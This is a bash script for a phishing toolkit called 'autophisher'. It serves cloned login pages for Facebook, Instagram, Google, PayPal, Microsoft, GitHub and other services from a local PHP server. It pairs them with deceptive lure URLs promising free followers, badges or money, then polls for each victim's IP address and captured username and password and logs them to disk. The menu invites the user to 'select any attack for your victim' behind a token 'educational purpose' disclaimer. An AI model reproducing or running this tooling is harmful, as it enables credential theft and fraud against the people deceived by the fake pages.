#!/bin/bash

## ANSI colors (FG & BG)
RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"

## Directories - Coding Ranjith
if [[ ! -d ".server" ]]; then
	mkdir -p ".server"
fi

if [[ ! -d "auth" ]]; then
	mkdir -p "auth"
fi

if [[ -d ".server/www" ]]; then
	rm -rf ".server/www"
	mkdir -p ".server/www"
else
	mkdir -p ".server/www"
fi

## Remove logfile - Coding Ranjith
if [[ -e ".server/.loclx" ]]; then
	rm -rf ".server/.loclx"
fi

if [[ -e ".server/.cld.log" ]]; then
	rm -rf ".server/.cld.log"
fi

## Script termination
exit_on_signal_SIGINT() {
	{ printf "\n\n%s\n\n" "${WHITE}[${GREEN}!${WHITE}]${BLUE} Program Interrupted." 2>&1; reset_color; }
	exit 0
}

exit_on_signal_SIGTERM() {
	{ printf "\n\n%s\n\n" "${WHITE}[${GREEN}!${WHITE}]${BLUE} Program Terminated." 2>&1; reset_color; }
	exit 0
}

trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM

## Reset terminal colors
reset_color() {
	tput sgr0   # reset attributes
	tput op     # reset color
	return
}

## Kill already running process
kill_pid() {
	check_PID="php cloudflared "
	for process in ${check_PID}; do
		if [[ $(pidof ${process}) ]]; then # Check for Process
			killall ${process} > /dev/null 2>&1 # Kill the Process
		fi
	done
}

## Banner
banner() {
	cat <<- EOF

		${GREEN}░█████╗░██╗░░░██╗████████╗░█████╗░██████╗░██╗░░██╗██╗░██████╗██╗░░██╗███████╗██████╗░
		${GREEN}██╔══██╗██║░░░██║╚══██╔══╝██╔══██╗██╔══██╗██║░░██║██║██╔════╝██║░░██║██╔════╝██╔══██╗
		${GREEN}███████║██║░░░██║░░░██║░░░██║░░██║██████╔╝███████║██║╚█████╗░███████║█████╗░░██████╔╝
		${GREEN}██╔══██║██║░░░██║░░░██║░░░██║░░██║██╔═══╝░██╔══██║██║░╚═══██╗██╔══██║██╔══╝░░██╔══██╗
		${GREEN}██║░░██║╚██████╔╝░░░██║░░░╚█████╔╝██║░░░░░██║░░██║██║██████╔╝██║░░██║███████╗██║░░██║
		${GREEN}╚═╝░░╚═╝░╚═════╝░░░░╚═╝░░░░╚════╝░╚═╝░░░░░╚═╝░░╚═╝╚═╝╚═════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝
		${GREEN}
		                                    ${BLUE}Version : ${__version__}

		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by CODING RANJITH (C.RANJITH KUMAR)${WHITE}
	EOF
}

## Small Banner
banner_small() {
	cat <<- EOF
		${BLUE}█████████████████████████████████████████████████████████████
		${BLUE}██▀▄─██▄─██─▄█─▄─▄─█─▄▄─█▄─▄▄─█─█─█▄─▄█─▄▄▄▄█─█─█▄─▄▄─█▄─▄▄▀█
		${BLUE}██─▀─███─██─████─███─██─██─▄▄▄█─▄─██─██▄▄▄▄─█─▄─██─▄█▀██─▄─▄█
		${BLUE}▀▄▄▀▄▄▀▀▄▄▄▄▀▀▀▄▄▄▀▀▄▄▄▄▀▄▄▄▀▀▀▄▀▄▀▄▄▄▀▄▄▄▄▄▀▄▀▄▀▄▄▄▄▄▀▄▄▀▄▄▀    ${WHITE} ${__version__}
	EOF
}
## Exit message
msg_exit() {
	{ clear; banner; echo; }
	echo -e "${GREENBG}${BLACK} Thank you for using this tool. Have a good day.${RESETBG}\n"
	{ reset_color; exit 0; }
}

## About
about() {
	{ clear; banner; echo; }
	cat <<- EOF
		${GREEN} Author   ${RED}:  ${ORANGE}C.RANJITH KUMAR ${RED}[ ${ORANGE}CODING RANJITH ${RED}]
		${GREEN} Github   ${RED}:  ${CYAN}https://github.com/CodingRanjith/autophisher
		${GREEN} Social   ${RED}:  ${CYAN}https://techackode.blogspot.com
		${GREEN} Version  ${RED}:  ${ORANGE}${__version__}

		${WHITE} ${REDBG}Warning:${RESETBG}
		${CYAN}  This Tool is made for educational purpose 
		  only ${RED}!${WHITE}${CYAN} Author will not be responsible for 
		  any misuse of this toolkit ${RED}!${WHITE}
		

		${WHITE}[${GREEN}00${WHITE}]${BLUE} Main Menu     ${WHITE}[${GREEN}99${WHITE}]${BLUE} Exit

	EOF

	read -p "${WHITE}[${GREEN}-${WHITE}]${BLUE} 𝙎𝙀𝙇𝙀𝘾𝙏 𝘼𝙉 𝙊𝙋𝙏𝙄𝙊𝙉 : ${BLUE}"
	case $REPLY in 
		99)
			msg_exit;;
		0 | 00)
			echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Returning to main menu..."
			{ sleep 1; main_menu; };;
		*)
			echo -ne "\n${WHITE}[${GREEN}!${WHITE}]${BLUE} Invalid Option, Try Again..."
			{ sleep 1; about; };;
	esac
}

## Setup website and start php server
HOST='192.168.1.69'
PORT='80'

setup_site() {
	echo -e "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} Setting up server..."${WHITE}
	cp -rf sites/"$website"/* .server/www
	cp -f  sites/ip.php .server/www/
	echo -ne "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} Starting PHP server..."${WHITE}
	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 & 
}

## Get IP address
capture_ip() {
	IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
	IFS=$'\n'
	echo -e "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} Victim's IP : ${BLUE}$IP"
	echo -ne "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} Saved in : ${ORANGE}auth/ip.txt"
	cat .server/www/ip.txt >> auth/ip.txt
}

## Get credentials
capture_creds() {
	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | awk '{print $2}')
	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | awk -F ":." '{print $NF}')
	IFS=$'\n'
	echo -e "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} Account : ${ORANGE}$ACCOUNT"
	echo -e "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} Password: ${ORANGE}$PASSWORD"
	echo -e "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} Saved in : ${ORANGE}auth/usernames.dat"
	cat .server/www/usernames.txt >> auth/usernames.dat
	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
}

## Print data
capture_data() {
	echo -ne "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} Waiting for Login Info, ${ORANGE}Ctrl + C ${BLUE}to exit..."
	while true; do
		if [[ -e ".server/www/ip.txt" ]]; then
			echo -e "\n\n${WHITE}[${GREEN}-${WHITE}]${BLUE} Victim IP Found !"
			capture_ip
			rm -rf .server/www/ip.txt
		fi
		sleep 0.75
		if [[ -e ".server/www/usernames.txt" ]]; then
			echo -e "\n\n${WHITE}[${GREEN}-${WHITE}]${ORANGE} Login info Found !!"
			capture_creds
			rm -rf .server/www/usernames.txt
		fi
		sleep 0.75
	done
}


## Start localhost
start_localhost() {
	echo -e "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} Initializing... ${GREEN}( ${ORANGE}http://$HOST:$PORT ${GREEN})"
	setup_site
	{ sleep 1; clear; banner_small; }
	echo -e "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} Successfully Hosted at : ${GREEN}${ORANGE}http://$HOST:$PORT ${GREEN}"
	capture_data
}


		## Facebook
site_facebook() {
		case $REPLY in 
		1 | 01)
      website="facebook"
      mask='http://blue-verified-badge-for-facebook-free'
			start_localhost;;
		2 | 02)
			website="fb_advanced"
			mask='http://vote-for-the-best-social-media'
			start_localhost;;
		3 | 03)
			website="fb_security"
			mask='http://make-your-facebook-secured-and-free-from-hackers'
			start_localhost;;
    4 | 04)
			website="fb_messenger"
			mask='http://get-messenger-premium-features-free'
			start_localhost;;
		*)
			echo -ne "\n${WHITE}[${GREEN}!${WHITE}]${BLUE} Invalid Option, Try Again..."
			{ sleep 1; clear; banner_small; site_facebook; };;
	esac
}

## Instagram
site_instagram() {
	cat <<- EOF

		${WHITE}[${GREEN}01${WHITE}]${BLUE} Traditional Login Page
		${WHITE}[${GREEN}02${WHITE}]${BLUE} Auto Followers Login Page
		${WHITE}[${GREEN}03${WHITE}]${BLUE} 1000 Followers Login Page
		${WHITE}[${GREEN}04${WHITE}]${BLUE} Blue Badge Verify Login Page

	EOF

	read -p "${WHITE}[${GREEN}-${WHITE}]${RED} 𝙎𝙀𝙇𝙀𝘾𝙏 𝘼𝙉 𝙊𝙋𝙏𝙄𝙊𝙉 : ${RED}"

	case $REPLY in 
		1 | 01)
			website="instagram"
			mask='http://get-unlimited-followers-for-instagram'
			start_localhost;;
		2 | 02)
			website="ig_followers"
			mask='http://get-unlimited-followers-for-instagram'
			start_localhost;;
		3 | 03)
			website="insta_followers"
			mask='http://get-1000-followers-for-instagram'
			start_localhost;;
		4 | 04)
			website="ig_verify"
			mask='http://blue-badge-verify-for-instagram-free'
			start_localhost;;
		*)
			echo -ne "\n${WHITE}[${GREEN}!${WHITE}]${BLUE} Invalid Option, Try Again..."
			{ sleep 1; clear; banner_small; site_instagram; };;
	esac
}

## Gmail/Google
site_gmail() {
	cat <<- EOF

		${WHITE}[${GREEN}01${WHITE}]${BLUE} Gmail Old Login Page
		${WHITE}[${GREEN}02${WHITE}]${BLUE} Gmail New Login Page
		${WHITE}[${GREEN}03${WHITE}]${BLUE} Advanced Voting Poll

	EOF

	read -p "${WHITE}[${GREEN}-${WHITE}]${RED} 𝙎𝙀𝙇𝙀𝘾𝙏 𝘼𝙉 𝙊𝙋𝙏𝙄𝙊𝙉 : ${RED}"

	case $REPLY in 
		1 | 01)
			website="google"
			mask='http://get-unlimited-google-drive-free'
			start_localhost;;
		2 | 02)
			website="google_new"
			mask='http://get-unlimited-google-drive-free'
			start_localhost;;
		3 | 03)
			website="google_poll"
			mask='http://vote-for-the-best-social-media'
			start_localhost;;
		*)
			echo -ne "\n${WHITE}[${GREEN}!${WHITE}]${BLUE} Invalid Option, Try Again..."
			{ sleep 1; clear; banner_small; site_gmail; };;
	esac
}



## Menu
main_menu() {
	{ clear; banner; echo; }
	cat <<- EOF
		${WHITE}[${GREEN}::${WHITE}]${BLUE} 𝙎𝙀𝙇𝙀𝘾𝙏 𝘼𝙉𝙔 𝘼𝙏𝙏𝘼𝘾𝙆 𝙁𝙊𝙍 𝙔𝙊𝙐𝙍 𝙑𝙄𝘾𝙏𝙄𝙈 ${WHITE}[${GREEN}::${WHITE}]${BLUE}

		${WHITE}[${GREEN}::${WHITE}]${RED} 𝙋𝙃𝙄𝙎𝙃𝙄𝙉𝙂-𝙈𝙊𝘿𝙐𝙇𝙀𝙎: ${WHITE}[${GREEN}::${WHITE}]${RED}

		${WHITE}[${GREEN}01${WHITE}]${BLUE} Facebook      ${WHITE}[${GREEN}02${WHITE}]${BLUE} Instagram       ${WHITE}[${GREEN}03${WHITE}]${BLUE} Google

		${WHITE}[${GREEN}04${WHITE}]${BLUE} Snapchat      ${WHITE}[${GREEN}05${WHITE}]${BLUE} Microsoft       ${WHITE}[${GREEN}06${WHITE}]${BLUE} Linkedin

		${WHITE}[${GREEN}07${WHITE}]${BLUE} Paypal        ${WHITE}[${GREEN}08${WHITE}]${BLUE} Twitter         ${WHITE}[${GREEN}09${WHITE}]${BLUE} Spotify

		${WHITE}[${GREEN}10${WHITE}]${BLUE} Mediafire     ${WHITE}[${GREEN}11${WHITE}]${BLUE} Github


		${WHITE}[${GREEN}99${WHITE}]${BLUE} About         ${WHITE}[${GREEN}00${WHITE}]${BLUE} Exit

	EOF
	
	read -p "${WHITE}[${GREEN}-${WHITE}]${RED} 𝙎𝙀𝙇𝙀𝘾𝙏 𝘼𝙉 𝙊𝙋𝙏𝙄𝙊𝙉 : ${RED}"

	case $REPLY in 
		1 | 01)
			site_facebook;;
		2 | 02)
			site_instagram;;
		3 | 03)
			site_gmail;;
        4 | 04)
			website="snapchat"
			mask='http://view-locked-snapchat-accounts-secretly'
			start_localhost;;
        5 | 05)
			website="microsoft"
			mask='http://unlimited-onedrive-space-for-free'
			start_localhost;;
		6 | 06)
			website="linkedin"
			mask='http://get-a-premium-plan-for-linkedin-free'
			start_localhost;;
        7 | 07)
			website="paypal"
			mask='http://get-500-usd-free-to-your-acount'
			start_localhost;;
		8 | 08)
			website="twitter"
			mask='http://get-blue-badge-on-twitter-free'
			start_localhost;;
		9 | 09)
			website="spotify"
			mask='http://convert-your-account-to-spotify-premium'
			start_localhost;;
		10 | 10)
			website="mediafire"
			mask='http://get-1TB-on-mediafire-free'
			start_localhost;;
		11 | 11)
			website="github"
			mask='http://get-1k-followers-on-github-free'
			start_localhost;;


		99)
			about;;
		0 | 00 )
			msg_exit;;
		*)
			echo -ne "\n${WHITE}[${GREEN}!${WHITE}]${BLUE} Invalid Option, Try Again..."
			{ sleep 1; main_menu; };;
	
	esac
}

## Main
kill_pid
main_menu
